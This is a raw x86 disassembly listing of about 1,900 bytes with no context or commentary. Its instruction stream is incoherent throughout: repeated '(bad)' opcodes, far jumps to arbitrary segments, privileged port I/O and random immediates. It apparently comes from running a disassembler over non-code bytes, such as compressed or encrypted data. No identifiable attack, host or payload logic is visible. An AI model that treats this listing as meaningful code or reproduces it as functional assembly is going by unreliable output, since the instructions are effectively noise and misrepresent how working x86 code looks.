  4109a2:	mov    esi,0xe08eeb2b
  4109a7:	cdq    
  4109a8:	adc    DWORD PTR [ecx+0xfccceb7],edi
  4109ae:	bound  esp,QWORD PTR [esi]
  4109b0:	adc    bh,BYTE PTR [eax]
  4109b2:	mov    edx,ecx
  4109b4:	test   al,0xe8
  4109b6:	mov    ch,0xec
  4109b8:	jns    0x410956
  4109ba:	sbb    al,0x8b
  4109bc:	and    al,bl
  4109be:	cmp    ebp,DWORD PTR [esi+0x51bf1a12]
  4109c4:	sbb    eax,0x872d3f63
  4109c9:	fnstenv [ecx+ebx*1+0x179f8d44]
  4109d0:	mov    al,ds:0x310b7916
  4109d5:	adc    cl,al
  4109d7:	sub    al,BYTE PTR [edx]
  4109d9:	xchg   ah,dl
  4109db:	gs int3 
  4109dd:	push   edi
  4109de:	(bad)  
  4109df:	mov    edi,0x7af729b4
  4109e4:	push   ds
  4109e5:	rcl    ebx,0x63
  4109e8:	push   ds
  4109e9:	jmp    0x1b90:0x91c3cb3e
  4109f0:	pop    ebx
  4109f1:	retf   
  4109f2:	das    
  4109f3:	leave  
  4109f4:	jb     0x410a68
  4109f6:	(bad)  
  4109f7:	stos   DWORD PTR es:[edi],eax
  4109f8:	jmp    0xfd10:0xfae3e23a
  4109ff:	imul   edi,edx,0xd3e10579
  410a05:	fmul   QWORD PTR [edx]
  410a07:	test   BYTE PTR [eax+0x42bf2aec],dh
  410a0d:	sar    BYTE PTR fs:[eax-0x5a],cl
  410a11:	iret   
  410a12:	pushf  
  410a13:	pop    ds
  410a14:	loopne 0x410a4d
  410a16:	in     al,dx
  410a17:	repz push esi
  410a19:	(bad)  
  410a1a:	mov    ?,WORD PTR [eax-0x7e39c0dc]
  410a20:	jae    0x410a6f
  410a22:	data16 lock int 0x41
  410a26:	test   eax,0xcc032c2f
  410a2b:	jp     0x410a2d
  410a2d:	sahf   
  410a2e:	mov    bl,0x59
  410a30:	call   0x74da7f2d
  410a35:	cwde   
  410a36:	xchg   esp,eax
  410a37:	fisttp QWORD PTR [edx]
  410a39:	xchg   DWORD PTR ds:0x4119c930,ebp
  410a3f:	dec    esp
  410a40:	fwait
  410a41:	ins    DWORD PTR es:[edi],dx
  410a42:	ja     0x410a50
  410a44:	arpl   WORD PTR [ebx],bp
  410a46:	mov    edx,0x86e3a1da
  410a4b:	jae    0x410a55
  410a4d:	sbb    al,0x30
  410a4f:	loop   0x410a6a
  410a51:	fxch   st(3)
  410a53:	cs in  eax,dx
  410a55:	les    eax,FWORD PTR [ebx+0x43a167d3]
  410a5b:	sub    BYTE PTR [esi+ebx*1],ah
  410a5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a5f:	adc    bl,BYTE PTR ds:0xe9fd774d
  410a65:	add    DWORD PTR [edi-0x6e],ecx
  410a68:	mov    ds:0x48990249,al
  410a6d:	rol    DWORD PTR [bp+0x8],1
  410a71:	fsubr  DWORD PTR [edi+0x7bc1a1fd]
  410a77:	jge    0x410a2c
  410a79:	mov    DWORD PTR [eax+0x60b9f7b7],edi
  410a7f:	xor    al,0x9c
  410a81:	outs   dx,DWORD PTR ds:[esi]
  410a82:	psubb  mm0,QWORD PTR [edi+0xb]
  410a86:	pop    ebx
  410a87:	jmp    0x114b:0x72dc0505
  410a8e:	sbb    ebp,ebp
  410a90:	int3   
  410a91:	leave  
  410a92:	push   ebx
  410a93:	test   DWORD PTR [esi],edi
  410a95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a96:	fisub  DWORD PTR [ebp+0x32]
  410a99:	xchg   al,ah
  410a9b:	sti    
  410a9c:	test   BYTE PTR [ecx+0x57],cl
  410a9f:	nop
  410aa0:	stos   BYTE PTR es:[edi],al
  410aa1:	push   edx
  410aa2:	repz and DWORD PTR [ecx-0x50400efa],esi
  410aa9:	cdq    
  410aaa:	pop    edi
  410aab:	inc    eax
  410aac:	daa    
  410aad:	nop
  410aae:	cmp    BYTE PTR [edx-0x2377d71],ch
  410ab4:	cmc    
  410ab5:	xor    esp,DWORD PTR [edx-0x2393c566]
  410abb:	shr    DWORD PTR [esi-0x32bbc1af],0x3b
  410ac2:	pusha  
  410ac3:	call   0xd4cf793b
  410ac8:	das    
  410ac9:	ror    ah,0xa3
  410acc:	shr    DWORD PTR [eax-0x52ffb160],cl
  410ad2:	push   ebp
  410ad3:	(bad)  
  410ad4:	pop    edx
  410ad5:	imul   edi,DWORD PTR [edi+0x7b],0x26
  410ad9:	adc    DWORD PTR [ebp-0x2bc29f1e],esi
  410adf:	inc    eax
  410ae0:	loopne 0x410a76
  410ae2:	mov    bl,0xa7
  410ae4:	sub    DWORD PTR [eax-0x3a36a035],ecx
  410aea:	add    esi,DWORD PTR [eax]
  410aec:	or     eax,ecx
  410aee:	xchg   esp,eax
  410aef:	aaa    
  410af0:	cmp    al,0xae
  410af2:	pop    eax
  410af3:	and    bl,ah
  410af5:	pop    eax
  410af6:	fmul   DWORD PTR ds:0x8e4886fd
  410afc:	cs cs add eax,0xf2ffa4a7
  410b03:	in     eax,dx
  410b04:	(bad)  
  410b05:	std    
  410b06:	mov    dh,dl
  410b08:	fs add eax,ebp
  410b0b:	fstp   TBYTE PTR [edi]
  410b0d:	int3   
  410b0e:	(bad)  
  410b0f:	ss (bad) 
  410b11:	popf   
  410b12:	inc    edi
  410b13:	dec    eax
  410b14:	push   esi
  410b15:	sbb    DWORD PTR [ecx*4+0x415c0cd2],eax
  410b1c:	ins    BYTE PTR es:[edi],dx
  410b1d:	into   
  410b1e:	xlat   BYTE PTR ds:[ebx]
  410b1f:	cmp    al,0xfb
  410b21:	cs adc al,0x86
  410b24:	rcr    BYTE PTR [esi+0x6b5faa8a],cl
  410b2a:	lods   eax,DWORD PTR ds:[esi]
  410b2b:	add    edi,eax
  410b2d:	fdiv   DWORD PTR [ecx+edx*4]
  410b30:	mov    ah,0x99
  410b32:	rcl    DWORD PTR [esi+ecx*2-0x268322a6],1
  410b39:	or     BYTE PTR [edi-0x3e],dh
  410b3c:	sub    eax,DWORD PTR [ecx-0x37]
  410b3f:	xchg   BYTE PTR [ecx-0x2c],dl
  410b42:	cmp    al,0xb4
  410b44:	arpl   bx,di
  410b46:	and    eax,0xbb133aca
  410b4b:	out    0x36,al
  410b4d:	mov    edi,0x71f3616d
  410b52:	pop    edx
  410b53:	cli    
  410b54:	adc    ebx,DWORD PTR [edi-0x3d]
  410b57:	pop    eax
  410b58:	mov    ah,0xe7
  410b5a:	mov    ds:0x66de30a,eax
  410b5f:	and    eax,0xb79ad99b
  410b64:	sar    DWORD PTR [eax],cl
  410b66:	inc    ebp
  410b67:	mov    al,ds:0x4272dda
  410b6c:	push   eax
  410b6d:	jno    0x410bea
  410b6f:	ins    DWORD PTR es:[edi],dx
  410b70:	jo     0x410ba6
  410b72:	add    eax,0x98c0799d
  410b77:	in     eax,0x43
  410b79:	jg     0x410b68
  410b7b:	adc    DWORD PTR [edi],esi
  410b7d:	mov    ebx,0x7ff11010
  410b82:	adc    al,0x73
  410b84:	mov    bh,0x3b
  410b86:	mov    ds,ecx
  410b88:	pusha  
  410b89:	test   eax,0xac25c062
  410b8e:	int    0xe2
  410b90:	leave  
  410b91:	xchg   esp,eax
  410b92:	xor    al,0xbd
  410b94:	adc    cl,BYTE PTR [esi-0x46]
  410b97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b98:	shl    DWORD PTR [edx+0x59],1
  410b9b:	out    dx,al
  410b9c:	adc    DWORD PTR [ecx+eax*8],ebx
  410b9f:	mov    al,ds:0x4dbb8dd6
  410ba4:	xchg   ebp,ebx
  410ba6:	fs popf 
  410ba8:	les    edi,FWORD PTR [ebp+0x4d]
  410bab:	jle    0x410c00
  410bad:	stc    
  410bae:	ja     0x410b90
  410bb0:	int    0x2a
  410bb2:	lahf   
  410bb3:	stc    
  410bb4:	adc    ebp,DWORD PTR [ebx+ecx*2+0x4a]
  410bb8:	stc    
  410bb9:	clc    
  410bba:	retf   0x8835
  410bbd:	mov    ebx,0x1e9d13ca
  410bc2:	retf   0x46d5
  410bc5:	or     esi,DWORD PTR [edx-0x7d]
  410bc8:	or     BYTE PTR [esp+edi*2+0xb50cff3],0xe5
  410bd0:	arpl   WORD PTR [ebx+ecx*2-0x59],dx
  410bd4:	cmp    BYTE PTR [eax],dh
  410bd6:	pop    edi
  410bd7:	xlat   BYTE PTR ds:[ebx]
  410bd8:	clc    
  410bd9:	mov    bh,0x64
  410bdb:	mov    eax,ds:0xf68b66a8
  410be0:	pop    edx
  410be1:	das    
  410be2:	pusha  
  410be3:	out    dx,eax
  410be4:	ja     0x410bf1
  410be6:	mov    bl,0x8e
  410be8:	and    al,0xca
  410bea:	test   DWORD PTR [esi+eax*1],esi
  410bed:	(bad)  
  410bee:	fidivr DWORD PTR [edx]
  410bf0:	jb     0x410bde
  410bf2:	inc    ebx
  410bf3:	aad    0x37
  410bf5:	in     al,0x83
  410bf7:	pop    esi
  410bf8:	gs in  eax,dx
  410bfa:	ret    0x2585
  410bfd:	in     al,dx
  410bfe:	test   BYTE PTR [ebx-0x5dd35def],0xe3
  410c05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c06:	fcomp  QWORD PTR ds:0x9d81b65c
  410c0c:	and    esp,DWORD PTR [ebx]
  410c0e:	add    al,0xaa
  410c10:	retf   0xa8f
  410c13:	mov    cl,0xaa
  410c15:	sbb    bh,dl
  410c17:	retf   0x9133
  410c1a:	mov    ebx,0x239831da
  410c1f:	inc    esi
  410c20:	dec    DWORD PTR [esp+ebp*4]
  410c23:	sbb    ah,BYTE PTR [eax+ebp*1]
  410c26:	push   esp
  410c27:	fsub   QWORD PTR [edi-0x5e54e537]
  410c2d:	xchg   ecx,eax
  410c2e:	pop    esi
  410c2f:	push   ebx
  410c30:	lods   al,BYTE PTR ds:[esi]
  410c31:	cld    
  410c32:	mov    edi,eax
  410c34:	mov    eax,ds:0x690d1ba8
  410c39:	mov    esp,0x1637767a
  410c3e:	rol    BYTE PTR [edi],1
  410c40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c41:	test   DWORD PTR [eax+ebx*4-0x74],ebp
  410c45:	dec    DWORD PTR [ecx]
  410c47:	xor    edi,ebx
  410c49:	jmp    0x410c8e
  410c4b:	stc    
  410c4c:	lods   al,BYTE PTR ds:[esi]
  410c4d:	arpl   WORD PTR [ebp-0x27],sp
  410c50:	loope  0x410c8c
  410c52:	adc    esp,DWORD PTR [esi]
  410c54:	dec    ebx
  410c55:	cmp    BYTE PTR [edx-0x2dcb5602],bl
  410c5b:	aad    0xb6
  410c5d:	lods   al,BYTE PTR ds:[esi]
  410c5e:	fwait
  410c5f:	mov    al,ds:0x8797f9dd
  410c64:	aas    
  410c65:	sbb    al,0x47
  410c67:	sbb    al,0xd0
  410c69:	sar    DWORD PTR [ebx-0x63],1
  410c6c:	ins    DWORD PTR es:[edi],dx
  410c6d:	sub    ebp,DWORD PTR [edx-0x15]
  410c70:	ins    DWORD PTR es:[edi],dx
  410c71:	(bad)  
  410c72:	imul   ecx,DWORD PTR [edi+0x42],0x69
  410c76:	test   al,0xb9
  410c78:	add    BYTE PTR [esi+0x2],0x15
  410c7c:	cmp    bl,BYTE PTR es:[edx-0x332da9ba]
  410c83:	jge    0x410d02
  410c85:	pop    ebp
  410c86:	inc    esp
  410c87:	sub    bh,ah
  410c89:	jae    0x410c99
  410c8b:	fdivrp st(3),st
  410c8d:	adc    al,0xbe
  410c8f:	neg    BYTE PTR [eax+0x43d822b1]
  410c95:	push   eax
  410c96:	js     0x410c42
  410c98:	aas    
  410c99:	xchg   esi,eax
  410c9a:	scas   al,BYTE PTR es:[edi]
  410c9b:	dec    ebp
  410c9c:	xor    ch,BYTE PTR [ecx-0x60ed58ab]
  410ca2:	jnp    0x410cc8
  410ca4:	mov    edx,0x4fdb6c9
  410ca9:	inc    edx
  410caa:	push   es
  410cab:	cld    
  410cac:	adc    edi,DWORD PTR [ebx+0x30]
  410caf:	lods   al,BYTE PTR ds:[esi]
  410cb0:	adc    ah,BYTE PTR [ebp-0x6c6c7c64]
  410cb6:	dec    eax
  410cb7:	and    BYTE PTR [ebx],dh
  410cb9:	shl    DWORD PTR [eax+0x9],0x72
  410cbd:	pop    edi
  410cbe:	push   edi
  410cbf:	jge    0x410cf8
  410cc1:	mov    ss,WORD PTR [ebx]
  410cc3:	fisttp WORD PTR [eax-0x38d10da5]
  410cca:	xor    eax,0x5c3f4cac
  410ccf:	xchg   ebp,eax
  410cd0:	cdq    
  410cd1:	ins    BYTE PTR es:[edi],dx
  410cd2:	dec    ebx
  410cd3:	cmp    al,ah
  410cd5:	add    DWORD PTR [ebx-0x24],ebx
  410cd8:	mov    ss,WORD PTR [esi]
  410cda:	scas   eax,DWORD PTR es:[edi]
  410cdb:	jmp    0xe7648eb4
  410ce0:	setg   BYTE PTR [ecx+edi*2]
  410ce4:	xor    dh,BYTE PTR [edi]
  410ce6:	std    
  410ce7:	push   ds
  410ce8:	sub    BYTE PTR [edx-0x702050e6],bl
  410cee:	cdq    
  410cef:	pushf  
  410cf0:	mov    bh,0x73
  410cf2:	popa   
  410cf3:	shl    BYTE PTR [ebp-0x8],cl
  410cf6:	xlat   BYTE PTR ds:[ebx]
  410cf7:	sub    eax,0xaad0153e
  410cfc:	shl    DWORD PTR [esi-0x16],1
  410cff:	inc    esi
  410d00:	les    esp,FWORD PTR [ecx-0x632c9796]
  410d06:	mov    WORD PTR [edx+0x7e],ss
  410d09:	gs ja  0x410d55
  410d0c:	dec    DWORD PTR [edx+0x1aed66ee]
  410d12:	fucom  st(3)
  410d14:	jl     0x410cc4
  410d16:	dec    edi
  410d17:	ds enter 0xaf96,0xd5
  410d1c:	pop    es
  410d1d:	pusha  
  410d1e:	add    DWORD PTR [ecx+0x311f7c70],ebx
  410d24:	fs daa 
  410d26:	sub    BYTE PTR [edi],dh
  410d28:	push   0xdc15c7c2
  410d2d:	xchg   edx,eax
  410d2e:	sub    DWORD PTR [eax-0x4caca734],eax
  410d34:	repz pop ecx
  410d36:	push   cs
  410d37:	es nop
  410d39:	(bad)  [ebx]
  410d3b:	or     eax,0x8fc1b073
  410d40:	out    dx,eax
  410d41:	imul   edx,DWORD PTR [eax],0x6c034b1e
  410d47:	dec    edx
  410d48:	pop    edx
  410d49:	xchg   eax,ecx
  410d4b:	mov    eax,0xfbfc5f9c
  410d50:	mov    DWORD PTR [ecx-0x72],esi
  410d53:	inc    ecx
  410d54:	xchg   ebx,eax
  410d55:	mov    ebp,DWORD PTR ss:[ebx]
  410d58:	outs   dx,BYTE PTR ds:[esi]
  410d59:	lahf   
  410d5a:	sub    bl,ah
  410d5c:	push   ebp
  410d5d:	out    0x53,eax
  410d5f:	jmp    0x5262d5fb
  410d64:	scas   eax,DWORD PTR es:[edi]
  410d65:	xor    esp,edx
  410d67:	push   edx
  410d68:	jle    0x410d2b
  410d6a:	jle    0x410d12
  410d6c:	dec    eax
  410d6d:	mov    al,0x8e
  410d6f:	push   ecx
  410d70:	dec    edx
  410d71:	add    BYTE PTR [eax-0x62f0a5c9],ah
  410d77:	loop   0x410dc1
  410d79:	std    
  410d7a:	jnp    0x410d73
  410d7c:	push   ds
  410d7d:	xchg   esi,eax
  410d7e:	sbb    eax,0x5124a2bc
  410d83:	aad    0xf2
  410d85:	dec    esp
  410d86:	mov    ch,0xb5
  410d88:	jmp    0x956ae268
  410d8d:	test   BYTE PTR [ecx+0x6b42aa7f],cl
  410d93:	mov    bl,0x70
  410d95:	xor    eax,DWORD PTR [eax+0x338dddce]
  410d9b:	jne    0x410d31
  410d9d:	and    dl,bl
  410d9f:	ins    BYTE PTR es:[edi],dx
  410da0:	push   ebp
  410da1:	pushf  
  410da2:	or     edx,DWORD PTR [eax]
  410da4:	test   BYTE PTR [esi],bl
  410da6:	repnz retf 0x2c65
  410daa:	sub    esi,DWORD PTR [ebp+0x59cf84c2]
  410db0:	cmp    BYTE PTR [edx],cl
  410db2:	cmp    bh,BYTE PTR [ebp-0x13306b3e]
  410db8:	jp     0x410db4
  410dba:	test   cl,bh
  410dbc:	jg     0x410d55
  410dbe:	mov    ch,0xe2
  410dc0:	cmp    DWORD PTR [edi-0x47b2fcd9],edx
  410dc6:	ror    DWORD PTR [edi-0x2421cc8],cl
  410dcc:	xor    cl,BYTE PTR [ebp+0xa]
  410dcf:	clc    
  410dd0:	popf   
  410dd1:	xchg   ecx,eax
  410dd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410dd3:	mov    edi,0x5295d067
  410dd8:	stos   DWORD PTR es:[edi],eax
  410dd9:	push   cs
  410dda:	xor    eax,0xa9e4a871
  410ddf:	pop    eax
  410de0:	out    0xd5,al
  410de2:	and    BYTE PTR [ebp+0x2f],bl
  410de5:	sub    BYTE PTR [ecx+0x40],al
  410de8:	push   0xe9b19d6d
  410ded:	pop    esp
  410dee:	mov    bh,0x5b
  410df0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410df1:	ficom  DWORD PTR [esi]
  410df3:	sbb    BYTE PTR [ecx],cl
  410df5:	pop    ebx
  410df6:	sub    BYTE PTR [edi-0x3e7f04c2],dl
  410dfc:	sub    ah,BYTE PTR [eax-0x3a]
  410dff:	and    edi,DWORD PTR [edx]
  410e01:	aam    0x6b
  410e03:	pop    edi
  410e04:	mov    al,0x96
  410e06:	aad    0xa2
  410e08:	sbb    dl,BYTE PTR es:[eax]
  410e0b:	(bad)  
  410e0c:	aad    0x45
  410e0e:	sar    BYTE PTR [ebp+ebx*8+0x363ff26f],0x27
  410e16:	test   BYTE PTR [edx],0x73
  410e19:	jno    0x410e4a
  410e1b:	outs   dx,DWORD PTR ds:[esi]
  410e1c:	lods   eax,DWORD PTR ds:[esi]
  410e1d:	mov    ebx,DWORD PTR [ecx]
  410e1f:	xchg   ebp,eax
  410e20:	jno    0x410df0
  410e22:	pop    eax
  410e23:	aad    0x30
  410e25:	fnsave [esi+0x55d143a6]
  410e2b:	cmp    BYTE PTR [esi],dl
  410e2d:	inc    eax
  410e2e:	aas    
  410e2f:	and    esp,DWORD PTR [esi]
  410e31:	fcomp  QWORD PTR [eax-0x43]
  410e34:	and    esi,edi
  410e36:	pop    esp
  410e37:	mov    ds:0xdea7af30,al
  410e3c:	mov    bl,0x3
  410e3e:	fcmovu st,st(3)
  410e40:	ficomp WORD PTR [edi+0x2ea3e0c3]
  410e46:	daa    
  410e47:	xor    ebx,DWORD PTR [ecx+0x48]
  410e4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e4b:	bound  edi,QWORD PTR [ebp+0x6a]
  410e4e:	inc    ebx
  410e4f:	cs mov ebp,ecx
  410e52:	or     al,0xc
  410e54:	into   
  410e55:	iret   
  410e56:	ds jmp 0x6775:0xd960b471
  410e5e:	enter  0x6624,0xf6
  410e62:	xor    esp,DWORD PTR [eax+0x2ec19863]
  410e68:	or     BYTE PTR [ebx+edx*1+0x1bf9cf0],0xa5
  410e70:	add    DWORD PTR [eax+0x1c694598],eax
  410e76:	add    ch,BYTE PTR [edi]
  410e78:	xchg   DWORD PTR [edi+0x21],esi
  410e7b:	mov    esi,0x5f08670
  410e80:	sub    al,0x4e
  410e82:	dec    edi
  410e83:	sbb    al,0x13
  410e85:	xor    DWORD PTR ds:0x7201beb6,0x1d
  410e8c:	push   ebx
  410e8d:	sbb    esp,ebp
  410e8f:	(bad)  
  410e90:	dec    edx
  410e91:	push   ebx
  410e92:	lea    esi,[ebx-0x1198bb35]
  410e98:	(bad)  
  410e99:	int    0x5f
  410e9b:	in     eax,0xb3
  410e9d:	pop    esi
  410e9e:	xor    eax,0x5b8df57b
  410ea3:	mov    ebp,0x7f36773
  410ea8:	(bad)  
  410ea9:	stc    
  410eaa:	sub    dl,BYTE PTR [ecx+0x30]
  410ead:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410eae:	dec    esi
  410eaf:	mov    ds:0xe17eb809,al
  410eb4:	daa    
  410eb5:	push   esp
  410eb6:	pop    edi
  410eb7:	push   edx
  410eb8:	in     eax,dx
  410eb9:	jns    0x410f20
  410ebb:	pop    ecx
  410ebc:	or     eax,0xd60bcaf7
  410ec1:	popa   
  410ec2:	aaa    
  410ec3:	xchg   ebp,eax
  410ec4:	mov    BYTE PTR [ecx+0x2ea53c8],dl
  410eca:	mov    dh,0x71
  410ecc:	test   al,0x2e
  410ece:	stos   DWORD PTR es:[edi],eax
  410ecf:	fistp  WORD PTR cs:[eax+0xa]
  410ed3:	pop    ss
  410ed4:	imul   BYTE PTR [ebx]
  410ed6:	mov    esp,0xd17143d6
  410edc:	in     al,0x33
  410ede:	jg     0x410f4a
  410ee0:	inc    edx
  410ee1:	sbb    ah,BYTE PTR [edx-0x53]
  410ee4:	adc    ebp,DWORD PTR [esi-0x62]
  410ee7:	and    al,0xd5
  410ee9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410eea:	dec    esi
  410eeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410eec:	and    DWORD PTR [ebx+0x523027a],ebp
  410ef2:	push   0x293676aa
  410ef7:	mov    WORD PTR [edi+0x6b6cdf25],cs
  410efd:	jno    0x410ed9
  410eff:	js     0x410eec
  410f01:	ins    DWORD PTR es:[edi],dx
  410f02:	pop    edi
  410f03:	pop    eax
  410f04:	mov    ds:0xaf320079,eax
  410f09:	ret    
  410f0a:	add    BYTE PTR [eax+0x6c],ah
  410f0d:	icebp  
  410f0e:	or     dh,BYTE PTR [esi-0x4a512efa]
  410f14:	push   cs
  410f15:	cmp    cl,ah
  410f17:	mov    dh,0x2b
  410f19:	pop    ebp
  410f1a:	das    
  410f1b:	pop    esp
  410f1c:	scas   al,BYTE PTR es:[edi]
  410f1d:	jno    0x410f3b
  410f1f:	jmp    0x410f10
  410f21:	xchg   esp,eax
  410f22:	cmp    BYTE PTR [ecx],bl
  410f24:	retf   
  410f25:	xchg   ebp,eax
  410f26:	test   al,dh
  410f28:	dec    eax
  410f29:	or     dh,BYTE PTR [esi]
  410f2b:	pusha  
  410f2c:	cmp    edx,edi
  410f2e:	add    DWORD PTR [edx-0x28],esi
  410f31:	mov    dl,BYTE PTR [esi]
  410f33:	popa   
  410f34:	arpl   WORD PTR [eax+0x4ca36cdf],bx
  410f3a:	jmp    0x90d436e2
  410f3f:	sub    eax,0x87c3bd82
  410f44:	outs   dx,DWORD PTR ds:[esi]
  410f45:	ds in  eax,dx
  410f47:	xchg   ebx,eax
  410f48:	into   
  410f49:	sub    eax,0x6be7b0e4
  410f4e:	adc    ebp,edi
  410f50:	into   
  410f51:	add    al,0x2e
  410f53:	(bad)  
  410f54:	xor    al,0x59
  410f56:	xor    BYTE PTR [edx-0x25],0x95
  410f5a:	cmp    eax,0xc056cfd1
  410f5f:	dec    eax
  410f60:	scas   eax,DWORD PTR es:[edi]
  410f61:	xlat   BYTE PTR ds:[ebx]
  410f62:	ss pop es
  410f64:	sbb    ecx,DWORD PTR [ecx-0x6e]
  410f67:	sbb    ah,BYTE PTR [edx+0x44]
  410f6a:	out    0x8b,al
  410f6c:	test   BYTE PTR [ebp-0x568eed85],bh
  410f72:	rcl    DWORD PTR [ebp+0x71],cl
  410f75:	call   DWORD PTR [ebx-0x73a28773]
  410f7b:	mov    ch,0xa3
  410f7d:	inc    esp
  410f7e:	sub    ecx,DWORD PTR [ecx-0x318087ae]
  410f84:	out    dx,al
  410f85:	xor    esp,0xa669312f
  410f8b:	leave  
  410f8c:	mov    DWORD PTR [ebx-0x108f03bd],ecx
  410f92:	pop    edi
  410f93:	xchg   esi,eax
  410f94:	pop    esi
  410f95:	aad    0xe7
  410f97:	xchg   ebp,eax
  410f98:	mov    ds:0xdb394dd3,eax
  410f9d:	daa    
  410f9e:	dec    esi
  410f9f:	popa   
  410fa0:	xchg   esi,eax
  410fa1:	out    dx,al
  410fa2:	pop    ds
  410fa3:	add    ebp,DWORD PTR [eax]
  410fa5:	push   0x49
  410fa7:	cmp    ebx,edi
  410fa9:	test   BYTE PTR [edx-0x2432e798],bl
  410faf:	jl     0x410fab
  410fb1:	jg     0x410fd4
  410fb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410fb4:	mov    ds:0x7b8f88d1,eax
  410fb9:	addr16 mov bl,0x3b
  410fbc:	adc    eax,0xa2281217
  410fc1:	repnz sbb BYTE PTR [ebx-0x2d],dl
  410fc5:	ror    DWORD PTR [eax],1
  410fc7:	leave  
  410fc8:	ret    
  410fc9:	and    ah,bh
  410fcb:	jecxz  0x411001
  410fcd:	xchg   edi,eax
  410fce:	scas   al,BYTE PTR es:[edi]
  410fcf:	sbb    bl,dl
  410fd1:	ins    DWORD PTR es:[edi],dx
  410fd2:	mov    esp,DWORD PTR [ebx-0x3e]
  410fd5:	xor    BYTE PTR [ebx-0x2504dd72],cl
  410fdb:	jne    0x411004
  410fdd:	sub    dh,BYTE PTR [edx-0x534b736a]
  410fe3:	mov    ecx,0x2690515b
  410fe8:	loope  0x41105e
  410fea:	ss ret 
  410fec:	xlat   BYTE PTR ds:[ebx]
  410fed:	push   ecx
  410fee:	cmp    DWORD PTR [esi+ecx*2-0x3c42be3a],edi
  410ff5:	adc    DWORD PTR [esi+edi*8-0x16],esi
  410ff9:	cmp    eax,0x5dcf79dd
  410ffe:	dec    esp
  410fff:	(bad)  
  411000:	mov    eax,ds:0xddca2128
  411005:	repnz mov bl,BYTE PTR [bp+si]
  411009:	out    0x15,eax
  41100b:	dec    esi
  41100c:	jbe    0x410f90
  41100e:	popf   
  41100f:	xchg   ebp,eax
  411010:	lods   eax,DWORD PTR ds:[esi]
  411011:	mov    ah,0x7a
  411013:	cld    
  411014:	enter  0xa001,0x63
  411018:	sub    DWORD PTR [eax+0x263f88e9],ebp
  41101e:	call   DWORD PTR [edi+0x16941e]
  411024:	inc    eax
  411025:	aam    0x14
  411027:	dec    ebx
  411028:	rol    ch,0x31
  41102b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41102c:	stos   BYTE PTR es:[edi],al
  41102d:	sbb    DWORD PTR [eax-0x69],edi
  411030:	pop    ecx
  411031:	loop   0x410fdf
  411033:	cmc    
  411034:	and    DWORD PTR [eax-0x7e559ebd],edi
  41103a:	out    dx,al
  41103b:	mov    al,0xaf
  41103d:	mov    cl,0xd5
  41103f:	dec    edx
  411040:	xor    ch,BYTE PTR [esi-0x5e]
  411043:	sub    BYTE PTR [edi-0x67fed7f9],0x26
  41104a:	dec    edx
  41104b:	cmc    
  41104c:	int3   
  41104d:	mov    dh,0x33
  41104f:	jmp    0xf6f013cd
  411054:	xor    DWORD PTR [ebx-0x7b441967],ebp
  41105a:	sbb    al,ah
  41105c:	(bad)  
  41105e:	jmp    0x411030
  411060:	mov    WORD PTR [eax+0x4139baff],cs
  411066:	(bad)  
  411067:	(bad)  
  411068:	mov    bl,0x3
  41106a:	ss add ecx,ecx
  41106d:	jno    0x4110a4
  41106f:	mov    ds:0x6631d064,al
  411074:	jp     0x41109a
  411076:	(bad)  
  411077:	cmp    al,0x75
  411079:	test   cl,cl
  41107b:	jnp    0x4110f6
  41107d:	inc    edx
  41107e:	add    BYTE PTR [ebx-0x4cdc7244],ch
  411084:	cs mov dl,0xd6
  411087:	mov    ebx,0x5b514190
  41108c:	icebp  
  41108d:	cs xchg edi,eax
  41108f:	jae    0x411109
  411091:	in     eax,dx
  411092:	int    0xbc
  411094:	mov    dl,0xe6
  411096:	jg     0x4110e7
  411098:	stc    
  411099:	add    eax,0x215d0cee
  41109e:	jl     0x4110ce
  4110a0:	les    edx,FWORD PTR [eax]
  4110a2:	inc    edx
  4110a4:	iret   
  4110a5:	jg     0x411059
  4110a7:	push   0x9c5d6de1
  4110ac:	or     edx,DWORD PTR [eax-0x7a905a19]
  4110b2:	push   esp
  4110b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110b4:	inc    ebp
  4110b5:	mov    al,0xba
  4110b7:	cmp    BYTE PTR [ecx-0x29],dh
  4110ba:	jbe    0x4110f1
  4110bc:	popa   
  4110bd:	cmp    edx,DWORD PTR [ecx+0x1101c9c6]
  4110c3:	in     eax,0x2c
  4110c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110c6:	fbstp  TBYTE PTR [eax+0x4ffc86f0]
  4110cc:	or     al,0x12
  4110ce:	stc    
  4110cf:	jae    0x41105d
  4110d1:	into   
  4110d2:	fwait
  4110d3:	int3   
  4110d4:	xor    BYTE PTR [ebx-0x54],al
  4110d7:	out    dx,eax
  4110d8:	dec    esi
  4110d9:	iret   
  4110da:	gs lahf 
  4110dc:	arpl   WORD PTR [ecx-0x31],dx
  4110df:	test   eax,0x36084071
  4110e4:	add    ebx,ebx
  4110e6:	dec    edi
  4110e7:	sub    esi,DWORD PTR [eax+0x24]
  4110ea:	sub    al,0xd6
  4110ec:	jno    0x411125
  4110ee:	into   
  4110ef:	out    0x11,al
  4110f1:	mov    DWORD PTR [edi-0x7fef135e],esp
  4110f7:	mov    ebx,0xce2708f1
  4110fc:	imul   esi,DWORD PTR [eax-0x26],0xfffffffc
  411100:	sub    BYTE PTR [ebp-0x1f],0xd8
  411104:	inc    ebp
  411105:	call   0xfb12:0x6ece2def
  41110c:	or     eax,0xb3c32a08
  411111:	les    eax,FWORD PTR [esi]
  411113:	jp     0x411143
  411115:	dec    edx
  411116:	jmp    0x411156
  411118:	pop    esp
  411119:	xor    BYTE PTR [ebx-0x7cf2ba3f],0x20
  411120:	scas   eax,DWORD PTR es:[edi]
  411121:	mov    DWORD PTR [eax],edx
  411123:	cld    
